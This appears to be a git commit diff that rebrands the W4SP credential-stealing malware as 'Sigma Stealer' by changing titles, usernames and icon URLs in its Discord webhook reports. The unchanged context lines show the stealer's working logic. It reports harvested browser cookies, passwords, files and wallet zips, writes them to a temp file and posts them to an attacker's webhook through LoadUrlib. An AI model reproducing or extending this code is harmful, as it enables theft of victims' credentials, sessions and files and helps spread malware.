1d03521d025deaa882c440b2ed153e5c1d9e9f9c
t0karev404 <128324367+t0karev404@users.noreply.github.com>
2023-06-28 19:28:54 +0200

    Update dhook_wasp.py

--- dhook_wasp.py
+++ dhook_wasp.py
@@ -330,16 +330,16 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "@W4SP STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                "text": "@Sigma STEALER",
+                "icon_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
-        "username": "W4SP Stealer",
+        "avatar_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png",
+        "username": "Sigma Stealer",
         "attachments": []
         }
     # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -367,17 +367,17 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "W4SP | Cookies Stealer",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [w4spCookies.txt]({link})",
+                    "title": "Sigma | Cookies Stealer",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n:cookie: • **{CookiCount}** Cookies Found\n:link: • [Cookies.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@W4SP STEALER",
-                        "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                        "text": "@Sigma STEALER",
+                        "icon_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png"
                     }
                 }
             ],
-            "username": "W4SP",
-            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+            "username": "Sigma",
+            "avatar_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -393,17 +393,17 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "W4SP | Password Stealer",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [w4spPassword.txt]({link})",
+                    "title": "Sigma | Password Stealer",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n🔑 • **{PasswCount}** Passwords Found\n:link: • [Password.txt]({link})",
                     "color": 14406413,
                     "footer": {
-                        "text": "@W4SP STEALER",
-                        "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                        "text": "@Sigma STEALER",
+                        "icon_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png"
                     }
                 }
             ],
-            "username": "W4SP",
-            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+            "username": "Sigma",
+            "avatar_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -422,16 +422,16 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "W4SP | File Stealer"
+                    "name": "Sigma | File Stealer"
                 },
                 "footer": {
-                    "text": "@W4SP STEALER",
-                    "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                    "text": "@Sigma STEALER",
+                    "icon_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png"
                 }
                 }
             ],
-            "username": "W4SP",
-            "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+            "username": "Sigma",
+            "avatar_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png",
             "attachments": []
             }
         LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
@@ -451,7 +451,7 @@ def upload(name, link):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--W4SP STEALER ON TOP-->\n\n")
+        f.write(f"<--Sigma STEALER ON TOP-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -616,17 +616,17 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "W4SP Zips",
+            "title": "Sigma Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 15781403,
             "footer": {
-                "text": "@W4SP STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                "text": "@Sigma STEALER",
+                "icon_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png"
             }
             }
         ],
-        "username": "W4SP Stealer",
-        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+        "username": "Sigma Stealer",
+        "avatar_url": " https://media.discordapp.net/attachments/1121397896256946199/1121603869017903175/ezgif-1-cd6290ab92.png",
         "attachments": []
     }
     LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
